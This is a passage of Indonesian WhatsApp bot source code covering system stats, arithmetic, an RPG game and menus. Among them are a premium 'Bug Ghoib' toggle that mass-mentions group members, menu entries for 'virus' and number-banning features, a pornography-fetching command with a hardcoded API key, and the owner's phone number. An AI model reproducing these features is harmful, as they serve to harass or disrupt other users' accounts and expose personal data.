				break
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) throw sticBanLu(from)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) reply(stdout)
if (stderr.trim()) reply(stderr)
}
}
break
case 'tambah':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Pertambahan 

Dan Hasil Nya 
${nilai_one} + ${nilai_two} = ${nilai_one + nilai_two}`)
break
case 'kurang':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perkurangan 

Dan Hasil Nya 
${nilai_one} - ${nilai_two} = ${nilai_one - nilai_two}`)
break
case 'kali':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perkalian

Dan Hasil Nya 
${nilai_one} × ${nilai_two} = ${nilai_one * nilai_two}`)
break
case 'bagi':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perbagian

Dan Hasil Nya 
${nilai_one} ÷ ${nilai_two} = ${nilai_one / nilai_two}`)
break
//=================================================//
//=================================================//
case 'bokep':{
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
rikibos.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
}
break
case 'penjara':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await rikibos.groupCreate(args.join(" "), [])
let response = await rikibos.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}
`
m.reply(teks)
break
     case 'antidelete':
      if (!isCreator) return reply(mess.only.owner)
       if (args.length < 1) return reply(`Cara menggunakan nya ${prefix}antidelete on/off`)
           if (args[0] === 'on'){
             antidelete = false
                    reply(`Berhasil mengaktifkan antidelete`)
                } else if (args[0] === 'off'){
                    antidelete = true
                    reply(`Berhasil menonaktifkan antidelete`)
                } else {
                    reply('ketik on untuk mengaktifkan, ketik off untuk menonaktifkan')
                }
                break
case 'antilink': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini ')
} else {
m.reply('ketik on untuk mengaktifkan,ketik off untuk menonaktifkan')
}
}
break
case 'buggoib': {
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await rikibos.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
rikibos.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Bug Ghoib di group ini')
} else {
let buttonsntnsfww = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, m)
}
}
break

//═══════════[ Rpg Menu ]═══════════\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{
if (isBan) throw sticBanLu(from)
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*❤ ️•Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*◻️️ •Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🌟 •Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*❇️ •Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*⏺ •️Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪 •Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟 •Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*🐔 •Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*🐇 •Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑 •Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*🐄 •Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*🐘 •Gajah:* ${getGajah(m.sender)}\n\n`
reply(teksehmazeh)
}
break
 case 'leaderboard': { 
if (isBan) throw sticBanLu(from)
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟 Ikan* : ${i.ikan}\n`
txt += `*🐔 Ayam* : ${i.ayam}\n`
txt += `*🐇 Kelinci* : ${i.kelinci}\n`
txt += `*🐑 Domba* : ${i.domba}\n`
txt += `*🐄 Sapi* : ${i.sapi}\n`
txt += `*🐘 Gajah* : ${i.gajah}\n\n`
}
 reply(txt)
}
 break
case 'mining': case 'mine':{
if (isBan) throw sticBanLu(from)
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang Lagi ⛏️'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: './rikilah/stickernye/tambang.jpg' },
 caption: caption,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
rikibos.sendMessage(from, buttonMessage, { quoted: m })

}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang⛏️`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//transaksi
 case 'beli': case 'buy':{
 if (isBan) throw sticBanLu(from)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { reply("Incorrect Format!") }
 }
 break
 
 case 'sell': case 'jual':{
 if (isBan) throw sticBanLu(from)
 if (!q) return reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { reply("Incorrect Format!") }
 }
 break
 case 'heal':{
 if (isBan) throw sticBanLu(from)
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break 
 case 'hunt': case 'hunting': case'berburu':{
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './rikilah/stickernye/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./rikilah/stickernye/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './rikilah/stickernye/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './rikilah/stickernye/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './rikilah/stickernye/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './rikilah/stickernye/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑 Domba* : ${domba}\n`
teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
 let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Berburu Lagi ️🏹'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: image },
 caption: teksehmazeh,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
rikibos.sendMessage(from, buttonMessage, { quoted: m }) 
}, 5000)
 setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
//=================================================//
case 'cowner': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Succes del friends`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'autovn': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autorecording === true) return
global.autorecording = true
m.reply(`Berhasil mengaktifkan autovn!`)
} else if (args[0] === 'off') {
if (autorecording === false) return
global.autorecording = false
m.reply(`Berhasil menonaktifkan autovn!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'autoketik': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoketik === true) return
global.autoketik = true
m.reply(`Berhasil mengaktifkan autoketik!`)
} else if (args[0] === 'off') {
if (autoketik === false) return
global.autoketik = false
m.reply(`Berhasil menonaktifkan autoketik!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'autoavailable': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoavailable === true) return
global.autoavailable = true
m.reply(`Berhasil mengaktifkan autoavailable!`)
} else if (args[0] === 'off') {
if (autoavailable === false) return
global.autoavailable = false
m.reply(`Berhasil menonaktifkan autoavailable!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'getname': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
namenye = await rikibos.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
rikibos.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
try {
pporg = await rikibos.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
rikibos.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await rikibos.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
rikibos.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//=================================================//
case 'creator': case 'crator': {
if (isBan) throw sticBanLu(from)
rikibos.sendContact(m.chat, global.owner, m)
}
break
//=================================================//
case 'owner': {
if (isBan) throw sticBanLu(from)
const templateButtons = [
{index: 1, urlButton: {displayText: 'GRUP', url: linkgrupss}}
]
const templateMessage = {
video:fs.readFileSync("./rikilah/video/rikibos.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `
◎ Terbit : 『 *29-07-2022* 』
◎ Lib : 『 Multi-Device 』
◎ Owner : 『 087741097274 』

『 🇮🇩 RIK BOT 』`,
footer: '© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
templateButtons: templateButtons
}
rikibos.sendMessage(m.chat, templateMessage)
}
break
//=================================================//
case 'bannomor': {
if (isBan) throw sticBanLu(from)
const templateButtons = [
{index: 1, urlButton: {displayText: 'Ban Nomor', url: linkpro}}
]
const templateMessage = {
video:fs.readFileSync("./rikilah/video/rikibos.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `
◎ Terbit : 『 *29-07-2022* 』
◎ Lib : 『 Multi-Device 』
◎ Owner : 『 087741097274 』

『 🇮🇩 RIK BOT 』`,
footer: '© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
templateButtons: templateButtons
}
rikibos.sendMessage(m.chat, templateMessage)
}
break

//=================================================//
case 'setallmenu': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let setbot = db.data.settings[botNumber]
 if (args[0] === 'templateImage'){
setbot.templateImage = true
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateDocument = false
sticSukses(from)
} else if (args[0] === 'templateVideo'){
setbot.templateImage = false
setbot.templateVideo = true
setbot.templateGif = false
setbot.templateDocument = false
sticSukses(from)
} else if (args[0] === 'templateGif'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = true
setbot.templateDocument = false
sticSukses(from)
} else if (args[0] === 'templateDocument'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateDocument = true
sticSukses(from)
} else {
let sections = [
{
title: "CHANGE MENU BOT",
rows: [
{title: "Template Image", rowId: `setallmenu templateImage`, description: `Ubah bot menu menjadi Template Image`},
{title: "Template Video", rowId: `setallmenu templateVideo`, description: `Ubah bot menu menjadi Template Video`},
{title: "Template Gif", rowId: `setallmenu templateGif`, description: `Ubah bot menu menjadi Template Gif`},
{title: "Template Document", rowId: `setallmenu templateDocument`, description: `Ubah bot menu menjadi Document Template `}
]
},
]
rikibos.sendListMsg(m.chat, `Silahkan Pilih SetAllMenu Yang Anda Mau!`, rikibos.user.name, `Hii kak ${pushname} 👋`, `Click Disini`, sections, m)
}
}
break
//=================================================//
case 'menu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *『MENU』*

Hii kak 『${pushname}』
Selamat 『${salam}』

Halo kak saya *𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳*
Saya Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll

Gunakan *BOT* dengan baik
Terima Kasih Semuanya

╭━═════════════━•
◎ Owner : 『 ${botname} 』
◎ Lib : 『 Multi-Device 』
◎ Terbit : 『 *29-07-2022* 』
╰━═════════════━•

『 🇮🇩 RIK BOT 』`

let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 300, 300)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'allmenu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
anu = `Hi kak ${pushname} selamat ${salam}

╭━═════════════━•
◎ Owner : 『 ${botname} 』
◎ Lib : 『 Multi-Device 』
◎ Terbit :『 *29-07-2022* 』
╰━═════════════━•
╭━═════════════━•
│➳ Hii kakak『 ${pushname} 』
╰━═════════════━•

╭━═════════════━•
│〇『 𝐈𝐍𝐅𝐎 』
╰━═════════════━•

╭━═════════════━•
│🜙 autovn = on / off
│🜙 autoketik = on / off
│🜙 autoavailable = on / off
│🜙 mute on / off
│🜙 antilink on / off
╰━═════════════━•

───〇『 *ALLMENU* 』

 🇮🇩 『 *RIK BOT* 』
╭━═════════════━•
│🜙 bot
│🜙 bannomor
│🜙 menurpg
│🜙 menuwibu
│🜙 asupanmata
│🜙 menukeren
│🜙 menuvirus
│🜙 cerpen
│🜙 menusuara
│🜙 menubot
│🜙 nsfw
│🜙 menubahagia
│🜙 menuprimbon
│🜙 islamiyah
│🜙 pengubahsuara
│🜙 beritaterbaru
│🜙 menucmd
│🜙 menucari
│🜙 menugrup
│🜙 menuunduh
│🜙 menudesah
│🜙 menuowner
╰━═════════════━•

╭━═════════════━•
│〇 *TERIMA KASIH* 〇
╰━═════════════━•

╭━═════════════━•
│───〇 𝐑𝐈𝐊 〇───
│───〇 𝐎𝐇  〇───
╰━═════════════━•

©𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
let btn = [{
urlButton: {
displayText: 'Sosmed',
url: 'https://www.instagram.com/ryarllh_01/'
}
}, {
callButton: {
displayText: 'Owner',
phoneNumber: '+6287741097274'
}
}, {
quickReplyButton: {
displayText: 'Status',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Setting Menu',
id: 'setallmenu'
}
}, {
quickReplyButton: {
displayText: 'Instagram',
id: 'instagram'
}
}]
 let setbot = db.data.settings[botNumber]
if (setbot.templateImage) {
